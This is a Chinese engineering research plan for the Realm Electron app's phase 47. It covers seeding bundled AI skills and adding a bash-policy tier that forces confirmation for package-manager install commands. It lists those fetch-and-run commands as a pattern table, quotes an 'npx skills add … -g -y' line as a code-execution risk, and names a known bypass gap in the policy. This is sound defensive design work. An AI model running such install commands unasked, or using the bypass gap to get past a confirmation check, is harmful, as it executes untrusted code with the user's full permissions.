---
phase: "47"
slug: "bash"
researched: 2026-09-11
domain: "Electron 内置技能随包分发（asarUnpack + 幂等播种）+ bash 包管理器安装档策略"
confidence: HIGH
---

# Phase 47: 内置技能播种 + bash 策略加固 - Research

**Researched:** 2026-09-11
**Domain:** 内置技能随包分发 / 原子播种 / bash 命令策略加固 / 第三方许可证归属
**Confidence:** HIGH（两条关键实证 A1/A2 均已实跑验证；E 段模式表经 33 正例 + 34 反例 + 15 逃逸向量实测）

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions

以下 18 条为 `/gsd-discuss-phase` 已拍板决策，**研究不得再提替代方案**。逐条原文照录：

**find-skills 改写形态（P1 门禁第一半）**

- **D-01:** **零安装 + 只读网络发现。** find-skills 不安装任何外部 CLI；正文引导模型用既有 `web_fetch` 工具直取**结构化技能索引端点**（GitHub 搜索 API / 技能注册表）获取真实仓库与 URL，`web_search` 仅作兜底，逐条核验后才输出候选清单。P1 门禁判据、SEED-03 禁用词清单、ROADMAP 成功判据 2 **全部保持原文不变**，不做任何需求变更。— **Reversibility:** costly — 用户明确要求把「恢复 CLI 路线」记入里程碑后续改版；一旦改走该路线需同步改 SEED-03 / ROADMAP 成功判据 2 / P1 判据三处并重写技能正文，前置条件是先引入 OS 级隔离。
- **D-02:** 正文开头**显式写死禁令**：「本技能只产出候选清单，绝不执行任何安装 / 下载命令；安装一律由用户在 Realm 内完成」。判定标准是「每一行按『这段文字被模型执行后会做什么』逐句评审」。
- **D-03:** 安装指路**前瞻指向设置页导入入口**（「由用户在 设置 → AI → 技能管理 → 导入 完成安装」）。Phase 47~50 期间该入口尚未实现，属可接受的中间态（六阶段同属 v2.6，发布时入口已存在）。不做「暂无入口时手动放入目录」的兼容分支 —— 手改目录这条指引本身接近安装语义。
- **D-04:** 内置技能的 `description` 用**中文、面向用户**。理由：内置技能 `disable-model-invocation: true` → 不进 system prompt，`description` 的实际消费者是 `/` 面板（48）与设置页列表（50）的人眼可读性。

**skill-creator 取用范围（SEED-01）**

- **D-05:** **完整保留上游 skill-creator 全部内容**，照 openhanako 的做法：`SKILL.md` + `scripts/`（9 个 Python）+ `references/schemas.md` + `assets/eval_review.html` + `eval-viewer/` + `LICENSE.txt`，**另加一个 Node 写的 `scripts/check_env.mjs`** 做环境预检（按 capability 分组报告 python ≥3.10 与 `pyyaml` / `anthropic` 依赖；支持环境变量覆盖解释器路径；带超时）。已接受的代价：约 100 KB Python 内容随包；用户需自备 python3 + 依赖；**每次运行 skill 脚本都会弹确认卡片**（`node` / `python3` 均在 `DANGEROUS_INTERPRETERS` 内且白名单不可越过 —— 这是 SKILL-09「复用既有机制、零新增权限」的必然结果，不是缺陷）。
- **D-06:** **正文语言分层**：自研 find-skills 改写版正文用**中文**；skill-creator 保持**上游英文正文**（仅做必要改写）。理由：自研内容面向 Realm 语境，上游内容保持英文便于日后逐行比对与跟进上游改动。
- **D-07:** 脚本是**可选路径而非主路径**：正文让 AI 优先用 Realm 自身的 `write` / `read` 工具完成技能创建与校验（与 Phase 49 `manage_skill` 自然衔接），仅当确实需要评测能力时才引导走 python3 脚本；走脚本前先调用 `check_env.mjs` 拿到能力清单，缺依赖时告知用户装什么。`check_env.mjs` 的价值独立于主/可选路径，始终随包提供。

**播种模型与打包（SEED-02 / SEED-05）**

- **D-08:** **每次启动按单个技能目录粒度同步 `managed-skills/<name>/`，无条件覆盖**（openhanako `syncSkills` 自愈模型）。整目录先写临时目录、再 rename 覆盖、失败回滚，不留半成品状态。同步判定的粒度为**单个技能目录**（不是整个目录一次判定），否则日后新增内置技能永不播种。
- **D-09:** **不静默覆盖**：同步前对比磁盘内容与随包内容，发现不一致（用户手改过）时先产出 `warning` 级诊断（含技能名 + 「已被随包版本覆盖」说明），再执行覆盖。— **Reversibility:** costly — 该决策显式偏离 O4 的「未修改才覆盖」字面；回退需引入内容 hash 状态与三分支判定，并同步调整 Phase 48 / 50 的诊断与展示语义。
- **D-10:** 用户在 `managed-skills/` 里手删内置技能后，**下次启动重播（自愈）**。「不要这个技能」的唯一语义是**禁用**（`settings.aiSkills.disabled`，Phase 46 D-09 已落定），`managed-skills/` 不允许手删。
- **D-11:** **seeded 身份判定 = 运行时扫描随包 `skills-builtin/` 的目录名集合**（每个目录须含 `SKILL.md`），**不落任何状态文件**。理由：删不掉、不双写、三环境 userData 不会分叉。该判定同时服务 Phase 48（`seeded` 来源徽标）与 Phase 49（按此判定拒绝覆盖 / 删除 seeded 技能），并满足 ROADMAP Phase 49 成功判据 3「按播种登记表判定，而非按目录位置」——这里的「登记表」即随包目录名清单，而不是一个可被删改的 JSON 文件。— **Reversibility:** costly — Phase 48 / 49 会消费该判定来源；改为状态文件需两个阶段同步改数据源，并引入可被删改、会跨环境分叉的状态。
- **D-12:** 随包分发走 **`asarUnpack` + `app.isPackaged` 路径分支**：`package.json` 的 `build.asarUnpack` 增加 `skills-builtin/**`；运行时 `app.isPackaged` 时读 `process.resourcesPath/app.asar.unpacked/skills-builtin/...`，开发态回落 `__dirname/skills-builtin`。得到真实文件路径后，播种可直接用递归复制（`readdirSync` + `copyFileSync`）。**必须实跑 `make install` 后的 .app 验证播种成功**，不能只跑 `npm run dev`。

**bash 包管理器安装档（SEC-01，P1 门禁第二半）**

- **D-13:** **家族覆盖**（不止需求枚举的 5 条）：`npx`；`npm` 的 `i` / `install` / `ci` / `exec`；`pnpm` 的 `add` / `install` / `dlx`；`yarn` 的 `add` / `install` / `dlx`；`bun` 的 `add` / `install` / `x`；`pip` / `pip3 install`；`python` / `python3 -m pip install`；`uv` 的 `pip install` / `add` / `tool install`；`uvx`；`brew` 的 `install` / `upgrade` / `reinstall`；`cargo install`；`go install`；`gem install`。理由：只堵字面 5 条会让 `yarn add` / `bun add` / `cargo install` / `uvx` / `npm ci` 成为完全等效的绕过口，门禁形同虚设。
- **D-14:** **实现为独立 `install` 档**（不是并入 `DANGEROUS_PATTERNS`，也不是扩充 `DANGEROUS_INTERPRETERS`）：`ai-bash-policy.js` 新增 `PACKAGE_MANAGER_INSTALL_PATTERNS` 表 + 新 `reason: 'install'` + 新 `installNames` 字段，与 `DANGEROUS_PATTERNS` **平行但语义分离** —— `danger` = 本机破坏性操作，`install` = 从网络获取并执行第三方代码。install 判定与 danger 一样**先于白名单检查**（白名单不可越过），`evaluateBashCommand` 现有的「危险优先 → 白名单 → 默认」流水线结构复用。
- **D-15:** 安装档 **`riskLevel = 'high'`** + 专属确认文案（「将从网络下载并运行第三方代码；该命令不会因为加入白名单而免确认」）。理由：`npm install` / `npx` 会在安装生命周期执行依赖的 `postinstall` 脚本，实质是任意代码执行，与 `rm` 同级合理。
- **D-16:** 判定粒度 = **命令名 + 子命令**，并**显式排除只读子命令**（`npm run` / `test` / `ls` / `view` / `audit` / `outdated`、`pnpm run`、`yarn run`、`brew info` / `list` / `search`、`pip list` / `show`、`cargo search`、`go list` 等）。`npm ci` **计入**安装档（同样执行依赖的 `postinstall` 脚本）。测试必须把这些只读命令写成**反例断言** —— `npm run dev` / `npm test` 是日常命令，误伤会驱动用户把 `npm` 整个加入白名单，反而一次放开安装档。

**许可证归属与文档同步（SEED-05 归属面 / DOC-02）**

- **D-17:** P10 归属义务：repo 根新增 `THIRD_PARTY_NOTICES`，逐技能记录**来源仓库 + 固定 commit SHA + 许可证 + 是否修改 + 修改说明**（find-skills 为 Realm 化改写版，**必须标注 modified**；skill-creator 保留上游原样，标注 unmodified + 保留 `LICENSE.txt` Apache-2.0）。每个内置技能目录内保留上游 `LICENSE.txt`，并**随播种一同落到** `managed-skills/<name>/`（播种是整目录复制，天然携带）。
- **D-18:** DOC-02 同步（按 AGENTS.md 的强制维护约定）：`docs/product/ai-agent-workspace.md` 与 `AGENTS.md` 明确写出「**技能不构成额外权限**」「`allowed-tools` 当前运行时不被强制，**仅供参考**」；`docs/product/ai-skills.md` 补「内置技能」与「bash 包管理器安装档」两个章节（含内置技能自愈式播种语义、seeded 身份来源、脚本执行的确认成本）。`allowed-tools` 的**解析**不在本阶段（Phase 46 已在已知限制中写明 SDK 无该字段），本阶段只做文档声明，不得在任何 UI 制造「该技能只能用这些工具」的虚假安全感。

### Claude's Discretion

- **`THIRD_PARTY_NOTICES` 的具体落点与扩展名**（repo 根 `THIRD_PARTY_NOTICES.md` vs 无扩展名文件）**以及是否随 .app 分发** —— 判据是 P10 要求的「归属完整」，交 plan 期按实现细节决定。
- **诚实边界的记录方式**：「安装档只审一级 bash 命令，脚本内部的二次 `spawn`（如 `check_env.mjs` 内部 `spawnSync` 调 python）不在策略视野内」是否写进 `docs/product/ai-agent-workspace.md` 的已知限制 —— 交 plan 期与 D-18 的文档同步任务一并决定。
- **find-skills 候选清单的字段规范与「核验后才能输出」的强制程度** —— 建议每条含名称 / 用途 / 仓库 URL / 许可证，且必须经 `web_fetch` 核验后才输出；具体文案交 plan 期定。
- **find-skills 正文里给出哪些具体检索端点** —— 必须先实测 `web_fetch`（turndown HTML→Markdown 管线）对 `api.github.com` 这类 **JSON** 响应是否原样返回；若 JSON 被转坏，退路是 `web_search` 定位仓库 + `web_fetch` 读仓库页，**仍然零安装**。这是 plan 期的必做实测项。
- **`check_env.mjs` 的具体实现**（capability 分组、超时、解释器覆盖环境变量名）—— 可参照 openhanako 的形状，交 plan 期定。

### Deferred Ideas (OUT OF SCOPE)

- **find-skills 恢复 CLI 路线**（在工作区内安装 skills CLI 做只读检索）—— **用户 2026-09-11 明确要求记入里程碑作为后续改版项**。前置条件：先引入 OS 级隔离（macOS `sandbox-exec`、Linux bubblewrap 等真沙箱），否则安装脚本仍以用户全权限执行、`-g` 也无法封堵。openhanako 的 `lib/sandbox/`（seatbelt + bwrap + win32 helper）是该前置条件的参考实现。
- **随包静态技能目录（离线兜底清单）** —— 需人工维护、必然过期，且多一份随包资源与许可证归属面；待零安装路线稳定后再评估。
- **openhanako 的 `install_skill` 工具模式**（AI 直接安装 GitHub 技能 + LLM 安全审查软门禁 + `risk_accepted` 确认令牌，令牌绑定 sourceKey 与内容摘要以防审查后内容被换）—— 与 Realm 的分工（Phase 49 `manage_skill` 不联网、Phase 51 用户驱动导入）不同。**其中的「审查结论绑定内容摘要 + 显式 `risk_accepted` 重试」流程**对 Phase 51 的两阶段预览有参考价值。
- **O4 的「版本戳登记表 + 未修改才覆盖」原始设计** —— 被 D-08/D-09 替代（改为无条件覆盖 + 差异诊断），不再作为本阶段实现目标；若日后出现「用户需要长期定制内置技能」的真实诉求，再评估恢复。
- **`allowed-tools` 的解析与展示** —— 本阶段只做文档声明（D-18）；若后续阶段要展示，必须带「当前运行时不被强制，仅供参考」免责标注（O3），执行层门禁明确 Out of Scope。
- **O5 显式解析 frontmatter（`yaml` 提升为直接依赖）** —— 归 Phase 51。

### 与需求字面偏离的两处（CONTEXT 显式决策，实施时不得静默回退）

- **O4「版本戳登记表 + 未修改才覆盖」→ 改为「每次启动无条件覆盖 + 差异诊断」**（D-08/D-09/D-10/D-11）：`managed-skills/` 是 app-owned 内容，用户定制走 `skills/` 同名遮蔽这条既有通道；同时 seeded 身份改为扫随包目录名清单（零状态文件），比登记表更抗删、不跨环境分叉。
- **SEED-05 的 `asarUnpack` 路线按字面保留**（D-12），但研究文档 `STACK.md` 实测推荐的是「显式递归读 asar + 零构建配置改动」。选定 asarUnpack 的理由：得到真实文件路径、与 nodejieba 先例一致，研究对 `cpSync` 在 asar 源上不可靠的顾虑在 asarUnpack 下不成立。

</user_constraints>

## Summary

本阶段两件事的**技术路径已全部实证**，无未知实现风险；剩余不确定性集中在 4 处**产品口径**（见 Open Questions），不是技术障碍。

**第一件事（内置技能播种）的可行性已由五项实证闭合：**

1. **`web_fetch` 对 JSON 原样返回 —— 已读源码确认，无需退路。** `search-manager.js:1626-1628` 有显式 `application/json` 分支，走 `JSON.stringify(JSON.parse(raw), null, 2)`，**不经过 turndown**。CONTEXT 里担心的"JSON 被转坏"不存在。`api.github.com` 因此可直取。
2. **GitHub 搜索 API 可无鉴权使用，但 code search 不可。** `GET /search/repositories?q=topic:...` 返回 200 + 完整仓库元数据（`full_name` / `stargazers_count` / `license.spdx_id` / `default_branch`）；`GET /search/code?q=filename:SKILL.md` 返回 **401 Requires authentication** —— 这条候选端点必须从 find-skills 正文里划掉。速率上限 **search 10 次/分钟**、core 60 次/小时（无 token）。
3. **`LICENSE.txt` / `scripts/` / `references/` 落在技能目录内零诊断。** 实跑 `refreshSkills`：`managed-skills/skill-creator/` 含 6 个文件（含 LICENSE.txt、scripts/*.py、scripts/check_env.mjs）→ `_cache.diagnostics` 与 `_cache.errors` 均空，且只加载出 1 个技能。SDK 在技能目录内找到 `SKILL.md` 即 `return`，**不再深入其子目录**（`skills.js:88-102`）。
4. **skill-creator 上游全量零安装语义。** 逐文件 grep 15 个上游文件（含 Python 与 HTML）→ `pip install` / `npm i` / `npx` / `brew install` / `apt-get install` **命中 0**。SEED-03 的禁用词门禁对 skill-creator 天然通过，**只有 find-skills 需要改写**（上游 141 行，12 行含 `npx`，第 100 行就是 `npx skills add <owner/repo@skill> -g -y`）。
5. **`asarUnpack` 路线正确，但发现一个更严重的既有泄漏。** 实测已构建的 `app.asar`：`files: []`（无 allowlist）**会把仓库根一切打进 asar** —— 59 个顶层条目、16,855 个文件，**含 `.planning/` 545 个文件，其中有 `.planning/research/PITFALLS.md`（P1 那份带 `npx skills add -g -y` 原文的重现说明）**。`skills-builtin/` 会因此自动入选，但同一机制也把 RCE 说明书随包发出去了。

**第二件事（bash install 档）的模式表已实测定型。** 我构造了 33 正例 + 34 反例 + 15 逃逸向量的语料，实测两版候选实现，最终建议表（E 段 `PACKAGE_MANAGER_INSTALL_PATTERNS`）**正例 0 漏检、反例 0 误伤**；加上"命令首 token 引号剥离"归一化后逃逸向量仅剩 `npm --prefix X i Y` 一类已知启发式缺口（与既有引擎"不是安全边界"的诚实声明同类）。

**已发现的三个必须让 planner 处理的硬约束：**

- **`installNames` 字段若加进 `allow` 分支，会打破 2 条既有断言**（`tests/test-ai-bash-policy.js:159-164` 用 `deepStrictEqual` 全对象比对 `{level:'allow', dangerNames:[]}`）。实测确认破裂。
- **CONTEXT 说的"29 例"是过时数字，实际是 32 例**（`node --test` 报 `# tests 32`）。
- **Realm 当前正从 `/Applications/Realm.app` 运行中**（PID 25922 + 一组 helper）。而 `make install` 的第一步是 `rm -rf /Applications/Realm.app`。D-12 要求的"实跑 make install 后启动 .app 验证"，**执行前必须先停掉用户实例，且清理只能按自身 PID**（AGENTS.md 安全纪律，历史上有路径模式 pkill 误杀生产版的事故）。

**Primary recommendation:**
按 `skills-builtin/`（静态内容）+ 新增 `builtin-skills-seeder.js`（播种/差异诊断）+ `ai-bash-policy.js` 加一张 `PACKAGE_MANAGER_INSTALL_PATTERNS` 表与一条 `install` 短路分支，三条独立线推进；安装档先用 E-1 节给出的表**照抄落地并立刻跑 E-4 的测试清单**，不要自己重新设计正则。

## Architectural Responsibility Map

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| 内置技能内容（SKILL.md + scripts/ + LICENSE.txt） | 随包静态资源（`skills-builtin/`，repo 根） | — | 内容不可变、按 SHA 归属；不能用构建期注入或运行时生成 |
| 内置技能 → asar 打包/解包 | 构建配置（`package.json` `build.asarUnpack`） | 运行时路径解析（`app.isPackaged`） | 与 nodejieba 先例同构：解包给真实文件路径，路径分支在运行时 |
| 随包目录 → `managed-skills/` 播种 | Main 进程启动链路（`agent-workspace` 邻近模块） | — | 只能在 `app.whenReady` 主进程；沙箱外的可信写者 |
| 播种的原子性（临时目录 → rename → 回滚） | Main 进程文件系统工具（`fs` 同步 API） | — | 无第三方依赖，`fs.renameSync` 同卷原子 |
| 差异检测与覆盖诊断 | Main 进程播种模块（`pushError` 形状） | 诊断消费（Phase 50 设置页） | 诊断形状必须与 Phase 46 `toRealmDiag`/`pushError` 对齐 |
| seeded 身份判定（D-11） | 播种模块（扫 `skills-builtin/` 目录名集合） | Phase 48 徽标 / Phase 49 保护判定 | 单源：随包目录清单，零状态文件 |
| 包管理器安装档判定 | 纯函数策略引擎（`ai-bash-policy.js`） | — | 与 danger 档同层，先于白名单；可单测、零 IO |
| 安装档确认卡片文案 | AI 主进程（`ai-manager.js` `_createBashToolWithPolicy`） | 渲染端确认卡片（既有） | 复用既有 `requestActionConfirmation` 通道 |
| 第三方归属记录 | repo 根静态文本（`THIRD_PARTY_NOTICES`） | 技能目录内 `LICENSE.txt`（随播种落盘） | Apache-2.0 §4 义务作用在分发物上，两个位置都要有 |
| 能力契约文档 | `docs/product/ai-skills.md` / `ai-agent-workspace.md` / `AGENTS.md` | — | AGENTS.md 强制维护约定 |

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| SKILL-09 | 技能自带 `scripts/` 可通过既有 bash 工具在沙箱内执行（复用白名单 + 确认卡片，零新增权限机制） | 载体是 skill-creator 的 `scripts/`（9 个 Python + 新增 `check_env.mjs`）。**执行路径天然被既有机制覆盖**：`node` / `python3` 均在 `DANGEROUS_INTERPRETERS`（`ai-bash-policy.js:177-180`）→ 任何脚本执行强制确认。沙箱 `exec` 的 `cwd` = 工作区根（`test-agent-workspace.js:134`）。见 E-3、Code Examples |
| SEED-01 | 随包内置 find-skills（Realm 化改写版）与 skill-creator（仅作者指南部分） | 上游 SHA 已取（B-1）；skill-creator 15 文件全文零安装语义（B-2 实测）；find-skills 上游 141 行需整体重写（A-3）。**注意 D-05「完整保留上游全部内容」与上游新增 `agents/` 的冲突** —— 见 Open Question Q1 |
| SEED-02 | 首次启动幂等播种到 `managed-skills/` | D-08/D-09/D-10 改为「每次启动按单技能目录粒度无条件覆盖 + 差异诊断」。原型：`openhanako/core/first-run.ts:252 syncSkills`（逐目录、`SKILL.md` 存在才同步、失败 continue 不 abort）；原子性原型 `shared/safe-fs.ts safeCopyDir`。调用点：`main.js:4040-4041` |
| SEED-03 | 内置技能文本不含任何「执行外部安装」语义 | 机器可检清单见 A-4；skill-creator 上游零命中（实测），find-skills 需全量重写。**门禁范围必须覆盖 scripts/ 与 resources，不只看 SKILL.md**（A-4 已给出扫描器） |
| SEED-04 | 内置技能默认 `disable-model-invocation: true` | **实测确认**：设该字段后 `cache.promptBlock` 长度为 0，技能不进 system prompt（probe 输出）。与 D-04「description 消费者是人眼」一致 |
| SEED-05 | 随包分发正确（`asarUnpack` + `app.isPackaged` 路径分支）+ LICENSE 与 `THIRD_PARTY_NOTICES` 归属 | 实测已构建 asar 证明 `files: []` 下 repo 根全量入包（D-1）；nodejieba 路径分支先例（D-2）；SHA 与许可证已核（B-1、F-4） |
| SEC-01 | 新增「包管理器安装」档强制确认，白名单不可越过 | 模式表实测定型（E-1）；插入点与返回形状（E-2）；确认卡片改动点（E-3）；**2 条既有断言会破**（E-2 实测） |
| DOC-02 | 同步 `docs/product/ai-agent-workspace.md` 与 `AGENTS.md`（技能不构成额外权限、`allowed-tools` 不被强制）；`docs/product/ai-skills.md` 补内置技能与 bash 档章节 | 三个文件的现状与精确改动点见 F-1 / F-2 / F-3 |

</phase_requirements>

## Standard Stack

### Core

**本阶段零新增 npm 依赖。** 这是刻意的：播种是同步文件系统操作，安装档是纯函数正则引擎，两者都不需要外部库。

| 库 / 模块 | 版本 | 用途 | 为何是它 |
|-----------|------|------|----------|
| `node:fs`（内置） | Node 22.22.0（本机实测 `node --version`） | 递归复制、`renameSync` 原子换名、`readdirSync` 扫目录 | `fs.cpSync` 已有先例（`agent-workspace.js:139` `migrateAiMemory`）；不需要 `fs-extra` |
| `node:crypto`（内置） | 同上 | 差异检测的内容 hash（`createHash('sha256')`） | 仓库既有先例：`media-cache-manager.js:69,78,300,463,478` 全用 `crypto.createHash('sha256')` |
| `node:path`（内置） | 同上 | 路径派生 | 全仓库统一 |
| `node:child_process`（内置） | 同上 | `check_env.mjs` 的 `spawnSync` 探 interpreter 与包 | 参照实现（openhanako `check_env.mjs:2`）就是 `import { spawnSync } from "node:child_process"` |
| `electron.app` | ^43.6.0（`package.json:33`） | `app.isPackaged` + `process.resourcesPath` 路径分支 | nodejieba 先例 |

### Supporting

| 库 | 版本 | 用途 | 何时使用 |
|----|------|------|----------|
| `electron-builder` | ^24.13.0（devDep） | `build.asarUnpack` 解包 `skills-builtin/**` | 仅在构建期；运行时不参与 |
| `node:test` + `node:assert` | Node 内置 | 新增测试 | 本仓库所有 `tests/*.js` 的统一约定 |

### Alternatives Considered

| 标准做法 | 替代方案 | 取舍 |
|----------|----------|------|
| `asarUnpack` + `app.isPackaged`（D-12） | `extraResources`（openhanako 路线） | **已否决**（CONTEXT）。asarUnpack 与 nodejieba 先例同构，且无需新增构建钩子 |
| asarUnpack | 显式递归读 asar 内文件 | **已否决**（CONTEXT）。理由是 asarUnpack 给出真实文件路径，`fs` 语义完整 |
| `fs.cpSync` 递归复制 | `fs-extra.copy` | 不引入依赖。既有 `migrateAiMemory` 已用 `fs.cpSync` |
| `crypto.createHash('sha256')` 做差异 | 逐字节 Buffer 比较 | hash 更省内存、可缓存中间结果；且仓库已有先例 |
| 手写正则表 | 引入 `shell-quote` / `bash-parser` 做真解析 | 不引入依赖。既有引擎已明确声明「静态拆段是启发式、不是安全边界」（`ai-bash-policy.js:10-12`），加解析器是能力升级而非本阶段目标 |
| 播种模块放 `agent-workspace.js` | 新建独立模块 | **建议独立模块**（如 `builtin-skills-seeder.js`），理由见 Architecture Patterns —— `agent-workspace.js` 是沙箱层，播种是「构建期资源 → 用户数据」的搬运，与沙箱职责不同（CONTEXT `code_context` 明确警告「不要把两个概念混在一处」） |

**Installation:**

```bash
# 无需安装任何新包。本阶段只改代码 + 新增静态资源目录。
```

**Version verification:**

```bash
node --version        # v22.22.0（本机实测，满足 node:test / fs.cpSync / crypto 全部要求）
npm view electron version        # 已装 ^43.6.0（package.json:33），本阶段不动
npm view electron-builder version # 已装 ^24.13.0（package.json:34），本阶段不动
```

本阶段**不新增、不升级**任何依赖，故无需对包做版本核查。唯一被"引入"的第三方内容是 **skill-creator 的静态文件副本**（Python + HTML + Markdown），它不是 npm 依赖，走 P10 归属流程而非包合法性流程。

## Package Legitimacy Audit

> **本阶段不安装任何外部包 —— 本节为 N/A，附证据。**

**结论：不适用。** Phase 47 **零新增 npm 依赖**（见 Standard Stack），`package.json` 的 `dependencies` / `devDependencies` 均不变。

| Package | Registry | Age | Downloads | Source Repo | Verdict | Disposition |
|---------|----------|-----|-----------|-------------|---------|-------------|
| （无） | — | — | — | — | — | — |

**逐项确认（每条都验证过本阶段不会引入包）：**

1. **播种模块**：只用 `node:fs` / `node:path` / `node:crypto` —— Node 内置，无 registry 来源。
2. **`check_env.mjs`**：只用 `node:child_process` / `node:process` —— Node 内置。参照实现 `check_env.mjs:1-3` 的 import 清单即全部。
3. **`ai-bash-policy.js` 的 install 档**：纯正则常量表，零 import（该文件当前 `module.exports` 之下无任何 `require`）。
4. **skill-creator 的 Python 脚本**：需要 `pyyaml` 与 `anthropic`，但这两个是**用户自备的 Python 包**，由用户在系统 Python 环境里安装 —— **不由 Realm 安装、不随包分发、不进 `package.json`**。D-07 的设计正是让 `check_env.mjs` **报告缺失**而非自动安装（`check_env.mjs:428-431` 的 `installGuidance` 原文明确写「Do not auto-install dependencies from this skill.」）。
5. **`scripts/__init__.py`**：0 字节占位文件。

**Packages removed due to [SLOP] verdict:** none
**Packages flagged as suspicious [SUS]:** none — 本阶段不装包，无需 `checkpoint:human-verify` 安装门。

> **例外提示（不是 npm 包，但需要归属门）**：skill-creator 的静态文件副本是**第三方源码**，P10 归属义务适用于它。这类内容的核验不走 `package-legitimacy check`，走 F-4 的 `THIRD_PARTY_NOTICES` 五要素。

## Architecture Patterns

### System Architecture Diagram

```
┌─────────────────────────── 构建期（electron-builder） ───────────────────────────┐
│                                                                                 │
│  repo 根 skills-builtin/  ────┬──► app.asar（默认全量入包，files:[] 无 allowlist）│
│    find-skills/               │                                                 │
│      SKILL.md（改写版·中文）   └──► app.asar.unpacked/skills-builtin/**          │
│      LICENSE.txt                     （asarUnpack: ["skills-builtin/**"]）      │
│    skill-creator/                                                               │
│      SKILL.md（上游英文）                                                        │
│      scripts/  references/  assets/  eval-viewer/  agents/                      │
│      LICENSE.txt（Apache-2.0）                                                  │
│                                                                                 │
│  repo 根 THIRD_PARTY_NOTICES ──────────────────────► app.asar（如需随包，见 F-4）│
└─────────────────────────────────────────────────────────────────────────────────┘
                                        │
                                        ▼
┌────────────────── 启动期（main.js app.whenReady） ──────────────────────────────┐
│                                                                                 │
│  main.js:4040  agentWorkspace.ensureWorkspaceDir()                              │
│                 └─► 建 workspace/ + .tmp/ + attachments/ + skills/ + managed-skills/
│  main.js:4041  agentWorkspace.migrateAiMemory()                                 │
│  ★ 新增         seedBuiltinSkills()   ← 必须在 ensureWorkspaceDir() 之后        │
│                   │                                                             │
│                   ├─ ① 解析随包源目录                                            │
│                   │     app.isPackaged ? process.resourcesPath/app.asar.unpacked │
│                   │                      /skills-builtin                        │
│                   │                    : path.join(__dirname,'skills-builtin')  │
│                   │     （读不到 → 产 error 诊断，不抛、不阻断启动）              │
│                   │                                                             │
│                   ├─ ② readdirSync 源目录（withFileTypes）→ 仅取 directory，     │
│                   │     且必须含 SKILL.md → 得 seeded 名字集合（D-11 身份来源）  │
│                   │                                                             │
│                   ├─ ③ 每个技能目录独立判定（D-08 单目录粒度）：                  │
│                   │     diff(源 vs managed-skills/<name>/)                       │
│                   │       ├─ 一致  → 跳过（省 IO）                                │
│                   │       └─ 不一致/缺失 → 先产 warning 诊断（D-09），           │
│                   │                        再 safeCopyDir 覆盖                    │
│                   │                                                             │
│                   └─ ④ 诊断汇总 → 模块级 errors/diagnostics（对齐 Phase 46 形状） │
│                                                                                 │
│  ─► aiManager = new AIManager();  →  aiManager.init()  →  refreshSkills()       │
│     （播种必须先于 aiManager.init()，否则首轮加载看不到内置技能）                 │
└─────────────────────────────────────────────────────────────────────────────────┘
                                        │
                                        ▼
┌──────────────── 运行时（每次 AI 请求 / bash 工具调用） ──────────────────────────┐
│                                                                                 │
│  用户/AI 触发 bash ─► _createBashToolWithPolicy().execute()                     │
│                         │                                                       │
│                         ▼                                                       │
│                    evaluateBashCommand(cmd, whitelist)   ← 纯函数，零 IO        │
│                         │                                                       │
│                         ├─ splitCommandPipeline(cmd)   引号感知拆段             │
│                         │                                                       │
│                         ▼  逐段：                                               │
│              ┌──────────────────────────────────────────┐                       │
│              │ ① matchDangerous(seg)  → reason:'danger' │  ← 既有，最高优先      │
│              │ ② matchInstall(seg)    → reason:'install'│  ★ 新增，与 danger 同级 │
│              │ ③ matchesWhitelist(seg) → allow           │  ← 达不到时若 ①② 命中  │
│              │ ④ 否则                  → reason:'default'│                       │
│              └──────────────────────────────────────────┘                       │
│                         │                                                       │
│                         ▼  verdict {level, reason, dangerNames, installNames}   │
│                    确认卡片（reason==='install' → riskLevel 'high' + 专属文案）  │
│                         │                                                       │
│                         ▼                                                       │
│                    inner.execute()  →  沙箱 exec（cwd = 工作区根）               │
└─────────────────────────────────────────────────────────────────────────────────┘
```

**图上的关键读法：** ① 构建期与启动期是**两条独立链路**（`skills-builtin/` 是打包源，`managed-skills/` 是运行时目标）——不要把二者混在一个访问器里。② 启动期播种**必须先于 `aiManager.init()`**，否则首轮 `refreshSkills()` 扫不到内置技能。③ 运行时 `install` 档与 `whitelist` 是**并联短路**：`install` 命中即不再看白名单。

### Recommended Project Structure

```
Realm/
├── skills-builtin/                     ★ 新增：随包内置技能（静态内容，非代码）
│   ├── find-skills/                    Realm 化改写版（中文正文、零安装语义）
│   │   ├── SKILL.md                    含 frontmatter：name / description(中文) / disable-model-invocation: true
│   │   └── LICENSE.txt                 上游 vercel-labs/skills 的 MIT 许可证
│   └── skill-creator/                  上游 anthropics/skills 副本（英文正文）
│       ├── SKILL.md                    上游 33,168 B（按 D-07 改写脚本段落）
│       ├── LICENSE.txt                 Apache-2.0（11,357 B）
│       ├── scripts/                    9 个上游 .py + ★ 新增 check_env.mjs
│       ├── references/schemas.md
│       ├── assets/eval_review.html
│       ├── eval-viewer/                generate_review.py + viewer.html
│       └── agents/                     analyzer.md / comparator.md / grader.md（见 Q1）
├── builtin-skills-seeder.js            ★ 新增：播种 + 差异诊断 + seeded 身份判定
├── ai-bash-policy.js                   改：+ PACKAGE_MANAGER_INSTALL_PATTERNS + install 分支
├── ai-manager.js                       改：_createBashToolWithPolicy 消费 'install'（约 :5647）
├── main.js                             改：:4041 之后插入 seedBuiltinSkills() 调用
├── package.json                        改：build.asarUnpack 追加 "skills-builtin/**"
├── THIRD_PARTY_NOTICES                 新增：P10 归属记录（落点/扩展名见 Q4）
├── tests/
│   ├── test-ai-bash-policy.js          改：+ install 档正反例（并修 :159-164 两条断言）
│   └── test-builtin-skills-seeder.js   ★ 新增：播种幂等 / 自愈 / 差异诊断 / 零安装语义扫描
└── docs/product/
    ├── ai-skills.md                    改：+ 「内置技能」「bash 包管理器安装档」两章
    └── ai-agent-workspace.md           改：§四 补 install 档 / §七 补诚实边界
```

**为什么播种模块要独立成文件而不是塞进 `agent-workspace.js`：**

